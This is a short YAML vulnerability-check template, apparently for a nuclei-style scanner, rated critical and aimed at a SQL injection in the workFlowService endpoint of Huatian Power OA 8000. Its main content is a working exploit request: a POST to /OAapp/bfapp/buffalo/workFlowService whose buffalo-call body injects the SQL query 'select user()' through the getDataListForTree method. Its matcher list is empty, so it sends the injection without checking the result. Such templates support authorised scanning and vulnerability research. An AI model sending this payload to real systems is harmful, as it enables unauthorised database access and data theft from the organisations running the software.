id: huatian-oa8000-sqli
brief:
    title: Huatian Power OA 8000 workFlowService - SQL injection
    by: SleepingBag945
    level: critical
    about: There is a SQL injection vulnerability in the workFlowService interface of Huatian Power OA 8000 version, through which an attacker can obtain sensitive database information
    label:
        - huatian
        - oa
        - sqli
        - vuln
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/OAapp/bfapp/buffalo/workFlowService'
      body: |-
        <buffalo-call>
        <method>getDataListForTree</method>
        <string>select user()</string>
        </buffalo-call>
      signs: []
